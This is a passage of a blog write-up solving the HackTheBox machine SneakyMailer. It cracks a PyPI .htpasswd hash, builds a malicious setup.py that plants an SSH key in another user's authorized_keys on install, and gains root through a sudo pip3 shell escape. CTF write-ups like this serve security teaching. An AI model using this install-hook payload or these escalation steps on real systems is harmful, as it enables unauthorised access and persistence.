+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 root root     4096 May 15 14:29 .</span><br><span class="line">drwxr-xr-x 6 root root     4096 May 14 18:25 ..</span><br><span class="line">-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd</span><br><span class="line">drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages</span><br><span class="line">drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ cat .htpasswd</span><br><span class="line">pypi:<span class="variable">$apr1</span><span class="variable">$RV5c5YVs</span><span class="variable">$U9</span>.OTqF5n8K4mxWpSSR/p/</span><br></pre></td></tr></table></figure>
+
+<p>Let’s run <code>john</code> on this hash to see if we can find the password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt pypihash                       Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"md5crypt"</span>, but the string is also recognized as <span class="string">"md5crypt-long"</span></span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">soufianeelhaoui  (pypi)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
+
+<p>Bingo we got credentials to install python package remotely to the server: <code>pypi</code>:<code>soufianeelhaoui</code>.</p>
+<h3 id="Creating-malicious-Python-Package"><a href="#Creating-malicious-Python-Package" class="headerlink" title="Creating malicious Python Package"></a>Creating malicious Python Package</h3><p>Now that we have the credentials and access to the PyPi server let’s create and upload a simple malicious package.</p>
+<p>An easy way to use it to pivot to <code>low</code> user would be to add our SSH key its <code>authorized_key</code> file.</p>
+<p>Following the documentation on <a href="https://pypi.org/project/pypiserver/#upload-with-setuptools" target="_blank" rel="noopener">PyPi server</a> we can create the following <code>setuptools</code>:</p>
+<blockquote>
+<p>Setuptools is a fully-featured, actively-maintained, and stable library designed to facilitate packaging Python projects.</p>
+</blockquote>
+<p>First let’s create our <code>.pypirc</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers = <span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">local</span>]</span><br><span class="line">repository: http://pypi.sneakycorp.htb:8080</span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure>
+
+<p>Then the malicious <a href="https://docs.python.org/3/distutils/setupscript.html" target="_blank" rel="noopener"><code>setup.py</code></a>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"/home/low/.ssh/authorized_keys"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(<span class="string">"\nssh-rsa AAAAB3NXXXXO2E= hg8@htb.htb"</span>)</span><br><span class="line">		f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">setuptools.setup(</span><br><span class="line">	name=<span class="string">"hg8"</span>,</span><br><span class="line">	version=<span class="string">"0.0.1"</span>,</span><br><span class="line">	author=<span class="string">"hg8.sh"</span>,</span><br><span class="line">	author_email=<span class="string">"hello@hg8.sh"</span>,</span><br><span class="line">	description=<span class="string">"A small example package"</span>,</span><br><span class="line">	url=<span class="string">"https://github.com/pypa/sampleproject"</span>,</span><br><span class="line">	packages=setuptools.find_packages(),</span><br><span class="line">	classifiers=[</span><br><span class="line">		<span class="string">"Programming Language :: Python :: 3"</span>,</span><br><span class="line">		<span class="string">"License :: OSI Approved :: MIT License"</span>,</span><br><span class="line">		<span class="string">"Operating System :: OS Independent"</span>,</span><br><span class="line">	],</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>Let’s upload both files on the server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/tmp/.hg8$ wget 10.10.14.15:8000/.pypirc</span><br><span class="line">‘.pypirc’ saved [128/128]</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:/tmp/.hg8$ wget 10.10.14.15:8000/setup.py</span><br><span class="line">‘setup.py’ saved [1138/1138]</span><br></pre></td></tr></table></figure>
+
+<p>To have our <code>.pypirc</code> taken in account we have to change the <code>$HOME</code> environment variable to our own folder:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/tmp/.hg8$ HOME=$(<span class="built_in">pwd</span>)</span><br><span class="line">developer@sneakymailer:~$ <span class="built_in">echo</span> <span class="variable">$HOME</span></span><br><span class="line">/tmp/.hg8</span><br></pre></td></tr></table></figure>
+
+<p>Then we should be able to run the <a href="http://setup.py/" target="_blank" rel="noopener">setup.py</a> script:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:~$ python3 setup.py sdist upload -r <span class="built_in">local</span></span><br><span class="line">running sdist</span><br><span class="line">running egg_info</span><br><span class="line">creating hg8.egg-info</span><br><span class="line">writing hg8.egg-info/PKG-INFO</span><br><span class="line">writing dependency_links to hg8.egg-info/dependency_links.txt</span><br><span class="line">writing top-level names to hg8.egg-info/top_level.txt</span><br><span class="line">writing manifest file <span class="string">'hg8.egg-info/SOURCES.txt'</span></span><br><span class="line">reading manifest file <span class="string">'hg8.egg-info/SOURCES.txt'</span></span><br><span class="line">writing manifest file <span class="string">'hg8.egg-info/SOURCES.txt'</span></span><br><span class="line">warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md</span><br><span class="line"></span><br><span class="line">running check</span><br><span class="line">creating hg8-0.0.1</span><br><span class="line">creating hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying files to hg8-0.0.1...</span><br><span class="line">copying setup.py -&gt; hg8-0.0.1</span><br><span class="line">copying hg8.egg-info/PKG-INFO -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/SOURCES.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/dependency_links.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/top_level.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">Writing hg8-0.0.1/setup.cfg</span><br><span class="line">creating dist</span><br><span class="line">Creating tar archive</span><br><span class="line">removing <span class="string">'hg8-0.0.1'</span> (and everything under it)</span><br><span class="line">running upload</span><br><span class="line">Submitting dist/hg8-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080</span><br><span class="line">Server response (200): OK</span><br></pre></td></tr></table></figure>
+
+<p>Looks like everything went fine, we should be able to login using our SSH key to <code>low</code> account:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb low@sneakymailer.htb</span><br><span class="line">Linux sneakymailer 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105</span><br><span class="line">low@sneakymailer:~$ cat user.txt</span><br><span class="line">dxxxxxxxxxxxxxxxxxxxxxx3</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The usual recon return an interesting sudo entry that can run command as root without password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">low@sneakymailer:/tmp$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> low on sneakymailer:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User low may run the following commands on sneakymailer:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/pip3</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pip-privilege-escalation"><a href="#Pip-privilege-escalation" class="headerlink" title="Pip privilege escalation"></a>Pip privilege escalation</h3><p>Let’s see on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFObins</a> if we can find a way to exploit <code>pip3</code> to get a shell or arbitrary file read/write in order to escalate our privileges to root.<br>Bingo, there is one way:</p>
+<blockquote>
+<p>If pip runs in privileged context it may be used to access the file system, escalate or maintain access with elevated privileges.<br><a href="https://gtfobins.github.io/gtfobins/pip/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/pip/</a></p>
+</blockquote>
+<p>Let’s give it a try using the example provided to spawn a privileged interactive shell: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">low@sneakymailer:/tmp$ TF=$(mktemp -d)</span><br><span class="line">low@sneakymailer:/tmp$ <span class="built_in">echo</span> <span class="string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="variable">$(tty)</span> &gt;<span class="variable">$(tty)</span> 2&gt;<span class="variable">$(tty)</span>')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">low@sneakymailer:/tmp$ sudo /usr/bin/pip3 install <span class="variable">$TF</span></span><br><span class="line">Processing ./tmp.1DjWlARdXF</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">bxxxxxxxxxxxxxxxxxxxxxxxx6</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/fishing/" rel="tag">fishing</a>, <a class="tag-link" href="/tags/ftp/" rel="tag">ftp</a>, <a class="tag-link" href="/tags/gtfobins/" rel="tag">gtfobins</a>, <a class="tag-link" href="/tags/htpasswd/" rel="tag">htpasswd</a>, <a class="tag-link" href="/tags/imap/" rel="tag">imap</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/php-reverse-shell/" rel="tag">php reverse shell</a>, <a class="tag-link" href="/tags/pip/" rel="tag">pip</a>, <a class="tag-link" href="/tags/pypi/" rel="tag">pypi</a>, <a class="tag-link" href="/tags/pypiserver/" rel="tag">pypiserver</a>, <a class="tag-link" href="/tags/setuptools/" rel="tag">setuptools</a>, <a class="tag-link" href="/tags/smtp/" rel="tag">smtp</a>, <a class="tag-link" href="/tags/sneakymailer/" rel="tag">sneakymailer</a>, <a class="tag-link" href="/tags/swaks/" rel="tag">swaks</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extract-users-email-list"><span class="toc-number">1.2.</span> <span class="toc-text">Extract users email list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phishing-through-SMTP"><span class="toc-number">1.3.</span> <span class="toc-text">Phishing through SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-FTP-Dev-server"><span class="toc-number">1.4.</span> <span class="toc-text">Access FTP Dev server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Reverse-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">PHP Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-developer"><span class="toc-number">1.6.</span> <span class="toc-text">Pivot www-data -&gt; developer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-developer-gt-low"><span class="toc-number">1.7.</span> <span class="toc-text">Pivot developer -&gt; low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-PyPi-server-htpasswd"><span class="toc-number">1.8.</span> <span class="toc-text">Cracking PyPi server htpasswd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-malicious-Python-Package"><span class="toc-number">1.9.</span> <span class="toc-text">Creating malicious Python Package</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pip-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Pip privilege escalation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
